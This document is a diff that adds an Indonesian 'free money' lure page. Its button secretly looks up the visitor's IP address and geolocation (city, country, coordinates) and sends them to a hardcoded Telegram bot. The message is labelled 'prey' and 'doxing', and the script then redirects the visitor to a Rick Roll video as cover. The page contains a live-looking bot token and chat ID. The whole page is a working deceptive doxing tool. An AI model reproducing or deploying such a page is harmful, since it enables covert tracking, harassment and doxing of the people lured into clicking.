@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Uang Gratis!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0f0f0;
+            font-family: sans-serif;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            background-color: #4CAF50; /* Hijau */
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 20px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>ADA UANG GRATIS UNTUK ANDA!</h1>
+        <button onclick="grabDataAndRedirect()">KLIK SINI ADA UANG</button>
+    </div>
+
+    <script>
+        async function grabDataAndRedirect() {
+            
+            let ip = 'Unknown IP';
+            let location = 'Unknown Location';
+
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                ip = ipData.ip;
+
+                const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const geoData = await geoResponse.json();
+                location = `${geoData.city}, ${geoData.country_name} (${geoData.latitude}, ${geoData.longitude})`;
+            } catch (error) {
+                console.error("Error fetching IP or location:", error);
+            }
+
+            const telegramBotToken = '8207894440:AAFV2A0cn2H6MIPehT3y0autNoSeSb-FxYU'; 
+            const chatId = '7984698827';           // GANTI DENGAN CHAT ID KAMU
+
+            const message = encodeURIComponent(
+                `MANGSA BOS\n` +
+                `TARGET IP: ${ip}\n` +
+                `LOCATION: ${location}\n` +
+                `SESIONS: 72962972\n` +
+                `IRFAN DOXING`
+            );
+
+            // Mengirim data ke Bot Telegram
+            await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`);
+
+            // Redirect ke halaman lain setelah data terkirim
+            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Redirect ke video Rick Roll sebagai umpan
+        }
+    </script>
+</body>
+</html>
